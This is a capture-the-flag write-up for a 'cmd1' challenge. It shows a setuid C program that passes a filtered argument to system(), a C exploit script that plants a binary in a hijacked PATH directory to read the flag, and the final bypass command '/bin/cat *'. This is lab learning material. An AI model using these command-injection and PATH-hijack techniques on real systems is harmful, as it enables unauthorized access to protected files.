A third parameter can be passed to a program - argc, argv, and envp (list of environment variables), and it can be controlled with 
**#include <unistd.h>**

       **int execve(const char ***_pathname_**, char *const _Nullable** _argv_**[],**
                  **char *const _Nullable** _envp_**[]);**

cmd1 program looks like so:
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}

The program calls a seperate function called filter(), this function returns non-zero value if argv[1] contains flag/sh/tmp inside it and if not executes argv[1]. Before that the function putenv() is called and sets PATH environment variable to /thankyouverymuch or if PATH does not exist creates a new variable named PATH with that value.
When you type a shell command and it is not an absolute path, the program checks PATH environment variable for the program that was requested. Our goal is to execute cat /home/cmd1/flag somehow and to do that we can just create the path /thankyouverymuch, create a program inside it that is executable called XXXXX, and then just call "/home/cmd1/./cmd1 XXXXX". No filtered words are included so it will perform system(XXXXX) which will be searched in /thankyouverymuch and executed, XXXXX will just call system("cat /home/cmd1/flag") and so with the permissions of the owner the flag will be shown

I wanted to perform everything in one program that i created, compiled and put in /tmp so i used the following script:
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    const char *dir_create = "mkdir -p /thankyouverymuch";
    const char *source_file = "/thankyouverymuch/XXXXX.c";
    const char *binary_file = "/thankyouverymuch/XXXXX";
    const char *source_code = 
        "#include <stdlib.h>\n"
        "int main() {\n"
        "    system(\"cat /home/cmd1/flag\");\n"
        "    return 0;\n"
        "}\n";

    system(dir_create);

    int fd = open(source_file, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) {
        perror("Failed to create source file");
        exit(EXIT_FAILURE);
    }
    if (write(fd, source_code, strlen(source_code)) != (ssize_t)strlen(source_code)) {
        perror("Failed to write source file");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
    printf("Wrote source file: %s\n", source_file);

    char compile_cmd[256];
    snprintf(compile_cmd, sizeof(compile_cmd), "gcc -o %s %s", binary_file, source_file);
    if (system(compile_cmd) != 0) {
        perror("Compilation failed");
        exit(EXIT_FAILURE);
    }
    printf("Compiled binary: %s\n", binary_file);

    if (chmod(binary_file, 0755) != 0) {
        perror("Failed to set executable permissions");
        exit(EXIT_FAILURE);
    }
    printf("Set executable permissions on: %s\n", binary_file);

    if (system("/home/cmd1/cmd1 XXXXX") != 0) {
        perror("Failed to execute /home/cmd1/cmd1");
        exit(EXIT_FAILURE);
    }
    printf("Executed: /home/cmd1/cmd1 XXXXX\n");
    return 0;
}

But then i figured out that I do not have access to create that directory in any way so I just executed "/bin/cat *"

![[asdasdasdasdasd.png]]